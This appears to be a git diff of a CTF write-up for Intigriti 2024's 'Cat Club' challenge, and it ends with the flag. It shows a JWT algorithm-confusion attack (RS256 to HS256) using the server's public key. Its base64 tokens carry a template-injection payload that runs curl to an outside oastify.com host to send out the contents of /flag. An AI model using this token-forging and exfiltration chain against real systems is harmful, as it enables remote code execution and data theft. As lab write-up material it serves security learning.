@@ -379,6 +379,7 @@ router.get("/jwks.json", async (req, res) => {
     }
 });
 ```
+![Cat Club JWK](/assets/img/Intigriti-ctf_2024/cat_club_jwk.png)
 
 #### Let's exploit <br>
 - First, let's create a script to extract and format the public key from the JWKS endpoint:
@@ -392,7 +393,7 @@ import json
 jwks = {
     "keys": [{
         "kty": "RSA",
-        "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMil0s4clcuyYYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQQpathL1zf3_Jk5IsbhE muU728cod12g0cURVFA3j4qMt94OtPqefzh89vljntTuZcQzYcGEtM7X9O9sSmgPuVc0f1N OmUFCasCzdHdjBNmNfhJLVY7iPxFPQGsRu8SsrqRfTSHjj3Rd_JmGlYCzF5ofsp_EOWPY CUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUtLbzJYoWFeY2OY_W+9vZb23xmmgo980A c51csyzgYQDQQLCxw4h9IxGEmWZ-Hdw",
+        "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw",
         "e": "AQAB",
         "alg": "RS256",
         "use": "sig"
@@ -425,7 +426,12 @@ But the JWT is using `RS256` alg so we need to change to `HS256` and then inject
 ```bash
 python3 jwt_tool.py --exploit k -pk public_key.pem "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7ZnVuY3Rpb24oKXtsb2NhbExvYWQ9Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDtzaD1sb2NhbExvYWQoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIHZoZzk4bWxlN21rcTQwZ3lvNHM3MzExZjI2OHh3cmtnLm9hc3RpZnkuY29tYGNhdCAvZmxhZypgJyl9KCl9In0.L8Z5MJNc5VTuBu9w5IFLnE6Slt5H5pJDCd_0xAgstz8"
 ```
+![Cat Club JWT](/assets/img/Intigriti-ctf_2024/cat_club_jwt.png)
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7ZnVuY3Rpb24oKXtsb2NhbExvYWQ9Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDtzaD1sb2NhbExvYWQoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIDllb241MGlzNDBoNDFlZGNsaXBsMGZ5dHprNWJ0Nmh2Lm9hc3RpZnkuY29tL2BjYXQgL2ZsYWcqYCcpfSgpfSJ9.7UG2A-miTBExSXBWoIh1TPsJdkOIUV5pEoBCZCqIm5U
+```
 
 Check the burp collaborator and we got the flag.
+![Cat Club Flag](/assets/img/Intigriti-ctf_2024/cat_club_flag.png)
 
 **Flag:** `INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}`
